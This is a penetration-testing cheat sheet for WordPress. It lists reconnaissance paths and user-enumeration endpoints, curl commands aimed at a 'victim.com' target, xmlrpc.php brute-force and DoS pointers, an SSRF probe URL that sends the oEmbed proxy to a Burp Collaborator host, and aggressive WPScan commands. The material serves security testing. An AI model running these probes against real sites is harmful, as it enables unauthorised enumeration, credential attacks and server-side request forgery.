# 🔷 WordPress

## Manual

### Information Gathering

* license.txt (wordpress version)
* wp-activate.php
* wp-content/uploads/
* wp-includes/
* wp-config.php

```bash
# get wordpress version
curl https://victim.com/ | grep 'content="WordPress'
```

### Users / IP

**Check for usernames :** /wp-json/wp/v2/users

**Could leak IP addresses :** /wp-json/wp/v2/pages

```bash
# get author name = potential user
curl -s -I -X GET http://blog.example.com/?author=1
```

## xmlrpc.php

### Active

> Credentials brute-force or use it to launch DoS attacks

{% embed url="https://github.com/relarizky/wpxploit" %}

### Exploit

{% embed url="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/" %}

## SSRF

/wp-json/oembed/1.0/proxy

### Try

```
https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net
```

## WPScan

{% embed url="https://github.com/wpscanteam/wpscan" %}

{% hint style="info" %}
WPScan WordPress security scanner. Written for security professionals and blog maintainers to test the security of their WordPress websites.
{% endhint %}

### Commands - with API

#### Default

```bash
# Enumerate all plugins with known vulnerabilities
wpscan --url $target -e vp --plugins-detection mixed --api-token $YOUR_TOKEN

# Enumerate all plugins in WPSCAN database (could take a very long time)
wpscan --url $target -e ap --plugins-detection mixed --api-token $YOUR_TOKEN
```

### Private Commands - with API

```bash
# Deeper scan
wpscan --url $target --ignore-main-redirect --detection-mode aggressive --plugins-detection mixed --api-token $YOUR_TOKEN
```
